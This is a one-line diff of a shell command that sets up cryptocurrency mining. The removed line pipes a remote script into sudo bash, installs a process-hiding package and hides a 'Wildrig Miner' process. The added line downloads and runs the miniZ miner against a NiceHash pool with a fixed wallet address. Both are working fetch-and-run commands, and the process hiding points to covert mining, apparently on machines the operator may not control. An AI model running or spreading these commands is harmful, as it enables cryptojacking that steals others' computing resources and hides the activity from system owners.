@@ -1,1 +1,1 @@
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add Wildrig Miner && apt install screen && screen
+sudo apt update && sudo apt install screen -y && wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y4rc2/miniZ_v1.8y4rc2_linux-x64.tar.gz && tar -xzvf miniZ_v1.8y4rc2_linux-x64.tar.gz && ./miniZ --algo ethash --url=3QAbQX6ggoZ8MXrQMpuGkr4AFfdpdpfo3G@stratum+tcp://daggerhashimoto.hk.nicehash.com:3353
